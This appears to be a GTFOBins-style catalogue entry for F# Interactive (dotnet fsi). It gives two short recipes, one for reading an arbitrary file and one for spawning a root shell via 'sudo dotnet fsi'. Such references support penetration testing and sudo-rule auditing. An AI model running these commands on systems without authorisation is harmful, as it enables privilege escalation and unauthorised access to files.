---
description: |
  F# Interactive (dotnet fsi) is used to run F# code interactively at the console, or to execute F# scripts.
functions:
  file-read:
    - code: |
        export LFILE=file_to_read
        dotnet fsi
        > System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable("LFILE"));;
  sudo:
    - code: |
        sudo dotnet fsi
        > System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;
---
